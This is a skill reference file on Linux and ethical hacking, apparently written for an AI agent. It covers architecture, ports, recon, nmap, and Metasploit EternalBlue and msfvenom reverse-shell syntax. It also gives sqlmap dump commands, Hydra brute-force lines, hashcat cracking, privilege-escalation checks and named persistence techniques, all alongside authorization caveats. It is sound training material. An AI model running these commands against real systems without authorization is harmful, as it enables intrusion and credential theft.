---
name: linux-ethical-hacking
description: Full reference skill for Linux architecture, networking (OSI/TCP-IP), the ethical-hacking / penetration-testing methodology (recon, scanning, exploitation, post-exploitation, reporting), core Linux commands, file-permission model, major tools (nmap, Metasploit, sqlmap, Hydra, Wireshark, hashcat), well-known CVEs, CTF platforms/categories, security certification roadmap, and the legal framework across regions. Use when the user asks about Linux internals, networking fundamentals, pentest methodology, common security tools, CVEs, or wants a learning roadmap for ethical hacking / CTF. Educational reference only — contains no real target data (no domain, IP, or company-specific findings); any real engagement requires separate written authorization.
---

# Linux & Ethical Hacking — Full Reference

This skill is a **study/reference guide**, not an attack tool and not a pentest
report. It intentionally contains **no identifying data for any real target**
(no domain, IP address, company name, or live scan findings) — only generic
syntax, methodology, and public knowledge (CVE IDs, protocol facts, tool
names). Any real-world use of the techniques below requires explicit written
authorization from the system owner (a signed pentest/bug-bounty scope, or a
system you personally own/control). Unauthorized access to systems is illegal
in essentially every jurisdiction and this skill must not be used to plan or
execute activity against a target without that authorization.

## 1. Linux Architecture

Layers from hardware up to applications:

| Layer | Role |
|---|---|
| Hardware | CPU, RAM, disk, GPU, NIC — the physical substrate; rings don't apply to it |
| Kernel (Ring 0 on x86) | Memory, process, filesystem, network management — most privileged CPU mode |
| Device drivers (Ring 0 on x86) | Hardware control — network, GPU, USB |
| System calls | Bridge between programs and kernel (`read()`, `write()`, `fork()`) |
| C library / glibc (Ring 3 on x86) | Shared functions programs use (`malloc()`, `printf()`, `fopen()`) |
| Shell (bash/zsh/fish, Ring 3) | Command interpreter |
| User applications (Ring 3) | Firefox, nmap, Wireshark, Python, etc. |

> Note: "Ring 0/3" is x86-specific CPU privilege-level terminology describing
> which *mode* code executes in (kernel vs. user), not a property of the
> hardware itself. Other architectures (ARM, RISC-V) use different privilege
> models and may not use "ring" terminology at all.

**Kernel subsystems**

| Subsystem | Function |
|---|---|
| Process scheduler | Allocates CPU time between processes |
| Memory manager | RAM and virtual memory management |
| Virtual File System (VFS) | Unified interface across filesystem types |
| Network stack | TCP/IP send/receive |
| IPC | Inter-process communication — pipes, sockets, signals |
| Security subsystem (LSM) | SELinux, AppArmor — mandatory access control |

**Boot process**: BIOS/UEFI (hardware POST, finds boot device) → Bootloader
(GRUB loads kernel into memory) → Kernel init (initializes devices) →
init/systemd (PID 1, starts services) → login shell.

## 2. Networking — OSI Model & TCP/IP

**OSI model (7 layers)**

| # | Layer | Protocols | Security relevance |
|---|---|---|---|
| 7 | Application | HTTP, FTP, DNS, SMTP | Web attacks, DNS poisoning |
| 6 | Presentation | SSL/TLS, JPEG, MPEG | SSL stripping, cert attacks |
| 5 | Session | NetBIOS, RPC, SMB | Session hijacking |
| 4 | Transport | TCP, UDP | Port scanning, SYN flood |
| 3 | Network | IP, ICMP, ARP | IP spoofing, MITM |
| 2 | Data Link | Ethernet, MAC, 802.11 | ARP spoofing, MAC flooding |
| 1 | Physical | Cables, radio, fiber | Physical access attacks |

**TCP three-way handshake**: SYN (client→server) → SYN-ACK (server→client) →
ACK (client→server, connection established). A SYN flood (many SYNs, no
final ACK) is a classic DoS technique — recognize it, never run it against
anything you don't own/have written authorization for.

**Commonly significant ports**

| Port | Proto | Service | Note |
|---|---|---|---|
| 21 | TCP | FTP | Unencrypted by default |
| 22 | TCP | SSH | Encrypted; brute-forceable if weak creds |
| 23 | TCP | Telnet | Unencrypted — avoid entirely |
| 25 | TCP | SMTP | Open relay abuse risk |
| 53 | TCP/UDP | DNS | Spoofing, amplification |
| 80 | TCP | HTTP | Unencrypted |
| 443 | TCP | HTTPS | Encrypted; MITM possible with forged/trusted-but-malicious certs |
| 445 | TCP | SMB | EternalBlue (MS17-010) / WannaCry history |
| 3306 | TCP | MySQL | Should never be internet-facing |
| 3389 | TCP | RDP | BlueKeep history; brute-force target |
| 5432 | TCP | PostgreSQL | Should never be internet-facing |
| 6379 | TCP | Redis | No auth by default in many deployments |
| 8080 | TCP | HTTP-alt | Admin panels, dev servers |
| 9200 | TCP | Elasticsearch | Often left open without auth |

## 3. Essential Linux Commands

**Navigation & files**
```
ls -la /etc              # list all files, incl. hidden, with details
cd /var/log
pwd
find / -name passwd 2>/dev/null
cat /etc/passwd
grep -r 'password' /var/www/
cp file.txt backup/  |  mv  |  rm
chmod +x script.sh   |   chown root:root file
tar -xzf archive.tar.gz
ln -s /path/to/file link
diff config.old config.new
```

**Process management**
```
ps aux                  # list all running processes
top / htop               # real-time monitoring
kill -9 PID
jobs / fg / bg
nohup command &          # survive terminal close
systemctl start/stop svc
crontab -e                # schedule tasks
```

**Networking**
```
ip a show eth0  |  ifconfig
ip route show
ping -c 4 8.8.8.8
traceroute google.com
netstat -tlnp  |  ss -tlnp | grep 80
curl -I https://site.com
wget https://site.com/file.zip
nc -lvnp 4444              # netcat listener
dig site.com ANY
nslookup site.com 8.8.8.8
whois example.com
```

## 4. File System & Permissions

| Directory | Contents | Relevance |
|---|---|---|
| `/etc` | System config | `passwd`, `shadow`, `sudoers`, crontab |
| `/var/log` | Logs | `auth.log`, `syslog`, web server logs |
| `/home` | User files | SSH keys, `.bash_history`, `.bashrc` |
| `/root` | Root's files | `.ssh/`, `.bash_history` |
| `/tmp` | Temp files | World-writable — common exploit staging |
| `/var/www` | Web files | Web shells, config files (if misconfigured) |
| `/etc/passwd` | User list | Usernames and home dirs |
| `/etc/shadow` | Password hashes | Requires root to read |
| `/etc/sudoers` | sudo rules | Privilege-escalation relevant |
| `/proc` | Process info | `/proc/self/environ` sometimes LFI-relevant |

**Permission notation**

| Symbolic | Octal | Meaning |
|---|---|---|
| `rwxrwxrwx` | 777 | Everyone reads/writes/executes — dangerous |
| `rwxr-xr-x` | 755 | Owner full, others read+execute |
| `rw-r--r--` | 644 | Owner read/write, others read only |
| `rwx------` | 700 | Owner only — most restrictive |
| `rws------` | 4700 | SUID — runs as file owner; privesc-relevant |
| `rwt------` | 1700 | Sticky bit (e.g. `/tmp`) |

## 5. Reconnaissance

**Passive** (no direct contact with the target — lower risk, still get consent
before acting on findings):

| Tool | Command pattern | Finds |
|---|---|---|
| whois | `whois <domain>` | Registrant, registrar, dates |
| dig | `dig <domain> ANY` | DNS records (A, MX, NS, TXT) |
| theHarvester | `theHarvester -d <domain> -b google` | Emails, subdomains, IPs |
| Sublist3r | `sublist3r -d <domain>` | Subdomains via search engines |
| Shodan | `shodan search '<query>'` | Internet-exposed devices |
| crt.sh | `curl 'https://crt.sh/?q=<domain>'` | SSL cert transparency / subdomains |
| Google Dorks | `site:<domain> filetype:pdf` | Exposed files |
| OSINT Framework | osintframework.com | Curated OSINT tool index |

**Useful Google dorks**: `inurl:admin`, `inurl:login`, `intitle:"index of"`,
`ext:sql` (exposed DB dumps), `ext:env` (exposed secrets) — all only against
scope you're authorized to probe; dorking public search results is passive,
but acting on what you find against a live system is not.

**Active** (direct contact — requires written authorization):
```
nmap -sn 192.168.1.0/24       # host discovery
nmap -sV -A <target>          # services + OS detection
curl -I https://<target>
openssl s_client -connect <target>:443
enum4linux -a <target>
dnsrecon -d <domain>
```

## 6. Scanning & Enumeration

**nmap**
```
nmap <target>                        # top 1000 ports
nmap -sV <target>                    # service versions
nmap -sV -A <target>                 # full scan + OS detection
nmap -p- <target>                    # all 65535 ports
nmap -sU <target>                    # UDP scan
nmap --script=vuln <target>          # vulnerability scripts
nmap -sS <target>                    # SYN scan — faster, stealthier
nmap -oN output.txt <target>         # save output
```

**Web app scanning**

| Tool | Command | Purpose |
|---|---|---|
| nikto | `nikto -h http://target` | Broad web vuln scan |
| dirb/gobuster | `gobuster dir -u http://target -w list.txt` | Hidden dir discovery |
| ffuf | `ffuf -u http://target/FUZZ -w list.txt` | Fast fuzzing |
| wpscan | `wpscan --url http://target` | WordPress-specific |
| whatweb | `whatweb http://target` | Tech fingerprinting |
| wafw00f | `wafw00f http://target` | WAF detection |

## 7. Exploitation Tools (authorized scope only)

**Metasploit**
```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010
show options
set RHOSTS <target>
set LHOST <your-ip>
run
sessions -l  |  sessions -i 1  |  background
msfvenom -p windows/meterpreter/reverse_tcp ...
```

**sqlmap**
```
sqlmap -u 'http://site/?id=1'
sqlmap -u URL --dbs
sqlmap -u URL -D db --tables
sqlmap -u URL -D db -T users --dump
sqlmap -u URL --level=5 --risk=3
sqlmap -u URL --forms
```

**Hydra (brute force)**
```
hydra -l admin -P rockyou.txt ssh://target
hydra -l admin -P rockyou.txt ftp://target
hydra -L users.txt -P pass.txt target http-post-form
hydra -t 4 -l root -P rockyou.txt ssh://target   # throttle threads
```

## 8. Hashcat — Password Cracking

| Hash type | Mode (-m) | Rough GPU speed class |
|---|---|---|
| MD5 | 0 | Very fast |
| SHA1 | 100 | Fast |
| SHA256 | 1400 | Fast |
| SHA512 | 1700 | Moderate |
| bcrypt | 3200 | Very slow (by design) |
| NTLM | 1000 | Very fast |
| WPA2 (handshake) | 22000 | Slow |
| PostgreSQL md5 | 11 | Fast |
| MySQL 4.1+ | 300 | Fast |
| SHA512crypt (`/etc/shadow`) | 1800 | Slow |

**Attack modes**: `-a 0` dictionary, `-a 1` combinator, `-a 3` brute force
(mask), `-a 6`/`-a 7` wordlist+mask hybrids.
```
hashcat -m 0 -a 0 hash.txt rockyou.txt
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d
hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule
hashcat -m 0 hash.txt --show
```
**Mask charset**: `?l` a-z, `?u` A-Z, `?d` 0-9, `?s` symbols, `?a` all of the
above. **Rule files** (`best64.rule`, `dive.rule`, `leetspeak.rule`, …) apply
smart transforms (`password` → `P@ssw0rd`) to a wordlist.

## 9. CVE Database & Well-Known Vulnerabilities

CVE = Common Vulnerabilities and Exposures, the public vulnerability registry.

| CVE ID | CVSS | Name | Affected |
|---|---|---|---|
| CVE-2017-0144 | 9.3 | EternalBlue (SMB RCE) | Windows XP–7, Server 2003–2008 |
| CVE-2021-44228 | 10.0 | Log4Shell (Log4j RCE) | Any Java app using vulnerable Log4j |
| CVE-2021-34527 | 8.8 | PrintNightmare | Windows Print Spooler |
| CVE-2019-0708 | 9.8 | BlueKeep (RDP RCE) | Windows XP/7/Server 2008 |
| CVE-2014-0160 | 7.5 | Heartbleed | OpenSSL 1.0.1–1.0.1f |
| CVE-2014-6271 | 10.0 | Shellshock (Bash RCE) | Bash < 4.3 |
| CVE-2021-3156 | 7.8 | Baron Samedit (sudo) | sudo < 1.9.5p2 |
| CVE-2022-0847 | 7.8 | Dirty Pipe | Linux kernel 5.8–5.16.11 |
| CVE-2023-4911 | 7.8 | Looney Tunables (glibc) | Ubuntu/Fedora/Debian privesc |
| CVE-2016-0728 | 7.2 | Keyring | Linux kernel root privesc |

**Finding CVEs**: NVD (nvd.nist.gov, official registry), Exploit-DB
(exploit-db.com, ready PoCs), `searchsploit <term>` (offline Exploit-DB
search), CVEdetails.com (stats), GitHub PoC search, Shodan `vuln:CVE-XXXX`
(exposed vulnerable hosts — recon only, never exploit without authorization).

## 10. Post-Exploitation (authorized lab/CTF scope only)

**Linux privilege escalation**

| Technique | Command | What it checks |
|---|---|---|
| sudo abuse | `sudo -l` | What you can run as root |
| SUID binaries | `find / -perm -4000 2>/dev/null` | Files that run as owner (root) |
| Cron jobs | `cat /etc/crontab` | Exploitable scheduled tasks |
| Writable `/etc/passwd` | `ls -la /etc/passwd` | Direct root-user injection |
| PATH hijacking | `echo $PATH` | Replaceable binary in PATH |
| Kernel exploits | `uname -r` | Match against known kernel CVEs |
| LinPEAS | `./linpeas.sh` | Automated enumeration |
| GTFOBins | gtfobins.github.io | SUID/sudo exploit database |

Persistence techniques (SSH key injection, cron backdoor, rogue user, web
shell, startup service) are **CTF/lab-only** concepts here — never applied
outside a scope you own or are explicitly contracted to test.

## 11. Wireshark & Traffic Analysis

**Useful filters**: `http`, `http.request.method == POST`,
`ip.addr == 192.168.1.1`, `tcp.port == 443`, `dns`, `tcp.flags.syn == 1`,
`http contains "password"`, `ftp` (plaintext protocol), `frame contains
"flag{"` (CTF flag hunting).

**tcpdump**
```
tcpdump -i eth0
tcpdump -i eth0 port 80
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap
tcpdump -A -r capture.pcap
strings capture.pcap | grep flag
```

## 12. CTF — Capture The Flag

| Platform | Level | Focus |
|---|---|---|
| OverTheWire Bandit | Beginner | Linux commands |
| PicoCTF | Beginner | All categories |
| TryHackMe | Beginner → Intermediate | Guided rooms |
| HackTheBox | Intermediate → Advanced | Real machines |
| VulnHub | Intermediate | Offline VMs |
| PortSwigger Web Security Academy | Intermediate | Web only |
| PentesterLab | Intermediate | Web + certs |
| CTFtime | All | Competition tracker |

**Categories & tools**: Crypto (hashcat, John, CyberChef — try Base64/ROT13/XOR
first), Web (Burp Suite, sqlmap, ffuf — check source & cookies), Forensics
(binwalk, strings, exiftool), Steganography (steghide, stegseek, zsteg), Reverse
(Ghidra, radare2, GDB), Pwn/Binary (pwntools, GDB, ROPgadget), OSINT (Google
dorks, Shodan), Network (Wireshark, tcpdump).

## 13. Security Certification Roadmap

| Cert | Level | Exam type | Notes |
|---|---|---|---|
| CompTIA Security+ | Beginner | MCQ, 90 min | Industry-standard baseline |
| eJPT (eLearnSecurity) | Beginner | Practical, 72h | Low-cost practical entry |
| CEH | Intermediate | MCQ, 4h | Widely known, theory-heavy |
| PNPT | Intermediate | Practical, 5 days | Very hands-on |
| OSCP | Advanced | Practical, 24h | Most respected practical cert |
| CISSP | Expert | MCQ, 6h | Management-level |
| CISM | Expert | MCQ, 4h | Security-management focus |

**Learning path**: Months 1–2 Linux + networking fundamentals + TryHackMe
Pre-Security → Month 3 Jr Pentester path + eJPT → Months 4–5 HTB Starting
Point + OverTheWire → Month 6 HTB Easy machines + Security+ → Months 7–9 HTB
Medium + PNPT prep → Months 10–12 OSCP lab → after OSCP: bug bounty
(HackerOne / Bugcrowd).

## 14. Tools Reference Sheet

| Tool | Category | Primary use |
|---|---|---|
| nmap | Scanning | Port & service scanning |
| hashcat | Password | GPU password cracking |
| john | Password | CPU password cracking |
| Metasploit | Exploitation | Full exploitation framework |
| sqlmap | Web | SQL injection automation |
| Burp Suite | Web | Web proxy & scanner |
| Wireshark | Network | Packet capture & analysis |
| tcpdump | Network | CLI packet capture |
| Hydra | Brute force | Multi-protocol brute force |
| gobuster | Web | Directory & DNS brute force |
| nikto | Web | Web vulnerability scanner |
| Sublist3r | Recon | Subdomain enumeration |
| theHarvester | Recon | Email & domain recon |
| LinPEAS | Privesc | Linux privilege-escalation enum |
| binwalk | Forensics | Binary analysis & extraction |
| exiftool | Forensics | File metadata analysis |
| steghide | Stego | Steganography detection |
| Ghidra | Reverse engineering | Static binary analysis |
| netcat | Network | General-purpose networking |
| searchsploit | Research | Offline CVE/exploit search |

## 15. Legal & Ethical Framework

| Allowed | Forbidden / criminal |
|---|---|
| Your own devices and network | Others' devices/networks without permission |
| Local lab VMs (VirtualBox, VMware) | Eavesdropping on public networks |
| Official CTF challenges | Data theft |
| A target you have written permission for | Selling vulnerabilities to malicious actors |
| Bug bounty programs (in scope) | Using tools with destructive/malicious intent |
| Contracted penetration testing | Accessing others' accounts |
| Responsible disclosure | Withholding disclosure from the affected owner |

**Laws by region** (always confirm current law in your jurisdiction — these
change; the below is for orientation, not legal advice):

| Region | Law | Penalty range |
|---|---|---|
| 🇦🇪 UAE | Federal Decree-Law No. 34 of 2021, Art. 73 (replaced Federal Law No. 5 of 2012, effective Jan 2, 2022) | Imprisonment + substantial fines |
| 🇺🇸 USA | Computer Fraud and Abuse Act (CFAA) | Up to 20 years imprisonment |
| 🇬🇧 UK | Computer Misuse Act 1990 | Up to 10 years imprisonment |
| 🇪🇺 EU | Directive 2013/40/EU | Up to 5 years imprisonment |
| 🌍 International | Budapest Convention on Cybercrime | Cross-border cooperation treaty |

---
*For educational purposes only. Use strictly within authorized engagements, your own lab, or official CTF platforms. No real target data is stored in this skill.*
